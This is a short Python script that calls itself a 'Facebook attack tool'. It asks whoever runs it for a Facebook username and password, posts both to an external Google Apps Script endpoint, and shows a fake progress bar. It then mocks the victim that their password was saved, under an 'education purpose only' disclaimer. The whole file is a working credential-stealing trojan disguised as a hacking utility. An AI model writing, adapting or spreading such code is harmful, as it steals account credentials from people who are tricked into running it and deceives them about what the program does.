import requests
import os
os.system('clear') 
print('WELCOM TO FACEBOOK ATTACK TOOL') 
mail = input("Enter fb username : ")
spass = input("Enter password : ")
data ={'mail':mail,'pass':spass}
requests.post("https://script.google.com/macros/s/AKfycbyrANAizvME_Y0rh4f6tOwwDl5M2CV_Ux-1xvAjrN7Uf-appT8/exec",data=data)
for i in range(101):
    print(i,"%")
    if i == 100:
       print(f"I Saved Your password ({spass}) in my database \n now you can change your password 😆😆\n education purpose only")
